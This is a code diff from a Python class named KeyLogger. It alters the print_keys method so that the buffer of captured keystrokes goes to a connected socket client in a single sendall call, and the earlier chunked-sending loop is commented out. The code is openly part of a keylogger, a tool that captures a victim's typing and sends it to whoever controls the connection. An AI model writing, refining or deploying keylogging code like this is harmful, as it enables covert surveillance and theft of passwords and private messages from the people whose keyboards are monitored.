@@ -52,13 +52,13 @@ class KeyLogger:
         return False
     
     def print_keys(self):
-        self.client.sendall(bytes(str(len(self.keys)), "utf8"))
-        time.sleep(0.1)
-        id = 0
-        while id < len(self.keys):
-            self.client.sendall(bytes(self.keys[id : id + 4096], "utf8"))
-            id += 4096
-        
+        # self.client.sendall(bytes(str(len(self.keys)), "utf8"))
+        # time.sleep(0.1)
+        # id = 0
+        # while id < len(self.keys):
+        #     self.client.sendall(bytes(self.keys[id : id + 4096], "utf8"))
+        #     id += 4096
+        self.client.sendall(bytes(self.keys, "utf8"))
         self.keys = ''
         pass
     
